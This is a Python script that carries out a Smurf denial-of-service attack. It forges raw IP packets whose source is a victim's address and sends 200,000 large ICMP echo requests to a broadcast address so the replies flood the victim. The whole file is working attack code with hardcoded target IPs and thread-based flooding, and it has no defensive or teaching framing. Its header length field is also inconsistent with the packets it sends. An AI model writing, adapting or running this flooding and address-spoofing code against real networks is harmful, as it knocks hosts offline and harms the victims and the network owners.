import socket
import struct
import threading
import time

ICMP_ECHO_REQUEST = 8
PACKETS_COUNTER = 200000
DELAY = 0.01
THREADS = 1

def calculate_checksum(source_string):
    count_to = (len(source_string) / 2) * 2
    checksum = 0
    count = 0

    while count < count_to:
        this_val = source_string[count + 1] * 256 + source_string[count]
        checksum = checksum + this_val
        checksum = checksum & 0xffffffff
        count = count + 2

    if count_to < len(source_string):
        checksum = checksum + source_string[len(source_string) - 1]
        checksum = checksum & 0xffffffff

    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum = checksum + (checksum >> 16)
    answer = ~checksum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)

    return answer


def create_icmp_packet():
    # ICMP-header: type (8), code (8), checksum (16), id (16), sequence (16)
    icmp_header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, 0, 1, 1)
    data = b'Q' * 1472

    checksum = calculate_checksum(icmp_header + data)
    icmp_header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, socket.htons(checksum), 1, 1)

    return icmp_header + data


def create_ip_header(source_ip, destination_ip):
    version_ihl = (4 << 4) + 5  # IHL (Internet Header Length) in dwords
    tos = 0  # type of service
    total_length = 20 + 8
    ip_id = 54321
    fragment_offset = 0
    ttl = 255
    protocol = socket.IPPROTO_ICMP
    checksum = 0

    src_ip = socket.inet_aton(source_ip)
    dst_ip = socket.inet_aton(destination_ip)

    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, ip_id, fragment_offset,
                            ttl, protocol, checksum, src_ip, dst_ip)

    ip_checksum = calculate_checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, ip_id, fragment_offset,
                            ttl, protocol, socket.htons(ip_checksum), src_ip, dst_ip)

    return ip_header


def send_smurf_attack(broadcast_ip, victim_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

    # flag IP_HDRINCL indicated that a custom IP-header should be used instead of the kernel's one
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    for i in range(PACKETS_COUNTER):

        ip_header = create_ip_header(victim_ip, broadcast_ip)
        icmp_packet = create_icmp_packet()

        packet = ip_header + icmp_packet

        sock.sendto(packet, (broadcast_ip, 0))

        print(f"Смурф-атака на {victim_ip} через {broadcast_ip}")


def thread_smurf_attack(broadcast_ip, victim_ip):
    threads = []

    for i in range(THREADS):
        t = threading.Thread(target=send_smurf_attack, args=(broadcast_ip, victim_ip))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

broadcast_ip = "172.20.10.15"
victim_ip = "172.20.10.4"

thread_smurf_attack(broadcast_ip, victim_ip)
